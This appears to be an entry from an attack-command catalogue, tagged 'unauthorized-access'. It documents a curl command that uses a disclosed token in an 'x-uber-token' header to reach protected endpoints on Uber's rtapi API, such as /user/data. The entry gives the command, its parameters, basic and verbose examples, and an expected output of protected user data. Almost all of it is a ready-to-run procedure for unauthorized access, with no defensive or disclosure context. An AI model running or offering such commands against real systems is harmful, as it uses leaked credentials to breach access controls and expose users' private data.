---
id: a49bd234-c909-455c-84fd-10ff43179609
name: curl-access-rtapi-with-token
type: command
executor: bash
data: >-
  curl -H "x-uber-token: YOUR_RETRIEVED_TOKEN"
  https://rtapi.uber.com/some-protected-endpoint
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.389Z'
platforms:
  - Web
tags:
  - api-call
  - unauthorized-access
verified: false
validated: true
submitted: true
---

# curl-access-rtapi-with-token

## Command

```bash
curl -H "x-uber-token: YOUR_RETRIEVED_TOKEN" https://rtapi.uber.com/some-protected-endpoint
```

## Description

This command sends an authenticated request to Uber's rtapi endpoints using a disclosed token in the x-uber-token header, allowing unauthorized access to protected resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H | Custom header for x-uber-token | Yes |
| YOUR_RETRIEVED_TOKEN | The disclosed rtapi token value | Yes |
| URL | Target rtapi endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -H "x-uber-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." https://rtapi.uber.com/user/data
```

### Advanced Usage

```bash
curl -v -H "x-uber-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." https://rtapi.uber.com/user/data
```

Use -v for detailed request/response inspection.

## Expected Output

Successful HTTP response with protected data, e.g., JSON user information. Errors may indicate invalid token or endpoint.

## Related

- [[Related Procedure]]
